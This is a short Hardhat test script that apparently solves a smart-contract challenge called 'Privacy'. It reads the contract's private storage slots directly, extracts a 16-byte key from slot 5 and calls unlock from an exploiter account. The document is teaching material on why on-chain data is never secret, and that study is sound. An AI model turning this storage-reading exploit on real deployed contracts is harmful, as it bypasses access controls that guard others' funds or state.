
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";

describe("PrivacyExploit", async () =>{

  it("Should get key", async () =>{
    await deployments.fixture(["Privacy"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc=await ethers.getSigner(exploiter)
    const privacyDeployment=await deployments.get('Privacy')

    
    const privacy = await ethers.getContractAt('Privacy',privacyDeployment.address)
    console.log(`Slot 0 (locked): ${await ethers.provider.getStorageAt(privacy.address,0)}`)
    console.log(`Slot 1(ID): ${await ethers.provider.getStorageAt(privacy.address,1)}`)
    console.log(`Slot 2(flattening,denomination,awkwardness): ${await ethers.provider.getStorageAt(privacy.address,2)}`)
    console.log(`Slot 3(data[0]): ${await ethers.provider.getStorageAt(privacy.address,3)}`)
    console.log(`Slot 4(data[1]): ${await ethers.provider.getStorageAt(privacy.address,4)}`)
    console.log(`Slot 5(data[2]): ${await ethers.provider.getStorageAt(privacy.address,5)}`)
    
    const data2 =await ethers.provider.getStorageAt(privacy.address,5) 
    
    const key="0x"+data2.slice(2,34) //0x is the prefix, then this slot is in hexadecimal, and it indicates a 256 bits value, meaning we are using 256/4=64 character, we should get chars from 2 to 34 from the original string to get our key
    await privacy.connect(exploiterAcc).unlock(key)
    expect(await privacy.locked(),"Privacy keep locked").to.be.false

  });
});
